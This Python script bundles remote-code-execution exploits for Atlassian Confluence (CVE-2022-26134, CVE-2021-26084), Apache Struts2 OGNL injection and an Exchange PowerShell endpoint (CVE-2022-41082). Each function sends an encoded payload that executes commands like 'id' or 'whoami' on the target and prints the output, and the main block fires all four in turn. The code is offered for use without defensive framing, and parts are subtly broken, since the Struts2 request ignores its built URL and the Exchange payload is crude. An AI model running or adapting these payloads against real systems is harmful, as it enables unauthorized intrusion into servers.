import requests
import urllib.parse

def exploit_cve_2022_26134(target_url):
    """
    CVE-2022-26134 Exploit (Atlassian Confluence RCE)
    """
    try:
        # Payload
        PAYLOAD = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        EXPLOIT_URL = f"{target_url}{PAYLOAD}"

        # Custom headers
        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
        }

        # Sending the request
        response = requests.get(EXPLOIT_URL, headers=HEADERS)

        # Displaying the response headers
        if response.status_code == 200:
            print("[+] CVE-2022-26134 Exploit sent successfully!")
            print("Server Response Header (X-Cmd-Response):")
            print(response.headers.get("X-Cmd-Response", "[!] Header not found."))
        else:
            print("[-] CVE-2022-26134 Exploit failed. Check target and parameters.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

def exploit_cve_2021_26084(target_url):
    """
    CVE-2021-26084 Exploit (Atlassian Confluence RCE via doenterpagevariables)
    """
    try:
        # Malicious POST payload
        PAYLOAD = "aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022whoami%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027"

        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        EXPLOIT_URL = f"{target_url}/pages/doenterpagevariables.action?SpaceKey=x"
        DATA = {"queryString": PAYLOAD}

        response = requests.post(EXPLOIT_URL, headers=HEADERS, data=DATA)
        if response.status_code == 200:
            print("[+] CVE-2021-26084 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[-] CVE-2021-26084 Exploit failed. Check target and parameters.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

def exploit_struts2_rce(target_url):
    """
    Struts2 RCE Exploit
    Target URL must be vulnerable to OGNL Injection.
    """
    try:
        # payload
        OGNL_PAYLOAD = (
            "%{(#context['xwork.MethodAccessor.denyMethodExecution']=false)."
            "(#_memberAccess['allowStaticMethodAccess']=true)."
            "(@java.lang.Runtime@getRuntime().exec('id'))}"
        )
        
        # Encoded payload to fit into the URL parameters
        encoded_payload = urllib.parse.quote(OGNL_PAYLOAD)
        
        # ★Custom headers★
        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        # ★Data for POST request★
        DATA = {
            "name": f"GLOOSECURITY{encoded_payload}",
            "description": "GLOOSECURITY_TEST",
        }

        EXPLOIT_URL = f"{target_url}/struts2-showcase/integration/saveGangster.action"
        # Sending the request
        response = requests.post(target_url, headers=HEADERS, data=DATA)

        # Displaying the response
        if response.status_code == 200:
            print("[+] Struts2 RCE Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[-] Struts2 Exploit failed. Check parameters or target availability.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

def exploit_cve_2022_41082(target_url):
    """
    CVE-2022-41082 Exploit (Exchange Server RCE via /powershell endpoint)
    """
    try:
        # Malicious payload to exploit CVE-2022-41082
        PAYLOAD = "powershell -Command ""Invoke-Expression('id')"""

        HEADERS = {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/soap+xml; charset=utf-8",
            "Accept": "*/*",
        }

        # Building the exploit URL
        EXPLOIT_URL = f"{target_url}/owa/mastermailbox%40outlook.com/powershell"

        # Sending malicious payload
        response = requests.post(EXPLOIT_URL, headers=HEADERS, data=PAYLOAD)

        if response.status_code == 200:
            print("[+] CVE-2022-41082 Exploit sent successfully!")
            print("Server Response:")
            print(response.text)
        else:
            print("[-] CVE-2022-41082 Exploit failed. Check target and parameters.")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Example Usage
if __name__ == "__main__":
    # Target URLs (나중에 통합 수정)
    cve_2022_26134_target = "http://example.com"
    cve_2021_26084_target = "http://example.com"
    struts2_target = "http://example.com"
    cve_2022_41082_target = "http://example.com"

    # Start point messages
    print("\n[*] Attempting CVE-2022-26134 Exploit...")
    exploit_cve_2022_26134(cve_2022_26134_target)

    print("\n[*] Attempting CVE-2021-26084 Exploit...")
    exploit_cve_2021_26084(cve_2021_26084_target)

    print("\n[*] Attempting Struts2 RCE Exploit...")
    exploit_struts2_rce(struts2_target)

    print("\n[*] Attempting CVE-2022-41082 Exploit...")
    exploit_cve_2022_41082(cve_2022_41082_target)
